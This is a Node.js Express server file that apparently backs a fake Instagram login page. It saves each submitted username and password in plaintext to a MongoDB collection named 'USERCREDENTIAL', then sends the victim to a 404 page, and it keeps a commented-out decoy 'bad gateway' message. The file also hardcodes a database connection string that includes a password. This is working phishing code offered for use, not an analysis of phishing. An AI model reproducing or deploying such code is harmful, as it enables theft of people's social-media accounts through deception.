const express = require('express')
const mongoose = require('mongoose');
const path = require('path');
const app = express()
const port = 3000
const DB = 'mongodb+srv://nikhil123:nikhil123@base1.fz8lbec.mongodb.net/?retryWrites=true&w=majority'

mongoose.connect(DB).then(()=>{
  console.log('connected');
}).catch((err)=>{
  console.log(err);
})

const userSchema = mongoose.Schema({
  username:{
    type:String,
    required:true
  },
  password:{
    type:String,
    required:true
  }
})
const User  = mongoose.model('USERCREDENTIAL',userSchema);
app.use(express.static(path.join(__dirname,'/instagramloginpage')))
app.use(express.urlencoded({extended:false}))
app.get('/', (req, res) => {
  res.send('Hello World!')
})

app.post('/login',(req,res)=>{
    // res.send('<img src="./assets/img/instagram.svg"></img><h1>Connection got disconnected due to bad gate way, try again </h1>')
    let username  = req.body.username;
    let password = req.body.password;
    const user = new User({username,password});
    user.save().then(()=>{
      console.log('hogaya');
      res.status(200)
      res.redirect('*'); 
    }).catch((err)=>{
      console.log(err);
    })
})
app.get('*',(req,res)=>{
    res.status(404)
    res.send('404 page not found');
})
app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
